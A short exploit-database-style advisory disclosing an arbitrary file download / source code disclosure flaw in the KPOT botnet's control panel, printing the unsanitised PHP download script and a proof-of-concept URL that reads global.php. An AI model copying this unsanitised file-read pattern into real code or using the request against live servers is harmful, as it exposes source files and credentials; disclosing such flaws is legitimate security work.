


Type: File Download/Source Code Disclosure Vulnerability

Vuln: http://localhost/download.php?file=global.php

Author: n4pst3r

```
################################
# Exploit Title: KPOT Botnet - File Download/Source Code Disclosure Vulnerability
# Google Dork: n/a
# Date: 26/11/2018
# Exploit Author: n4pst3r
# Vendor Homepage: unkn0wn
# Software Link: https://bhf.io/threads/515432/
# Version: unkn0wn
# Tested on: Windows 10, debian 7
# CVE : n/a
################################
# Vuln-Code: download.php
<?php
if (isset($_GET['file']))
{
	$file = $_GET['file'];
	header('Content-Disposition: attachment; filename="'.basename($file).'"');
	header('Content-Length: ' . filesize($file));
	readfile($file);
}
?>
################################
PoC:
http://127.0.0.1/download.php?file=global.php
```

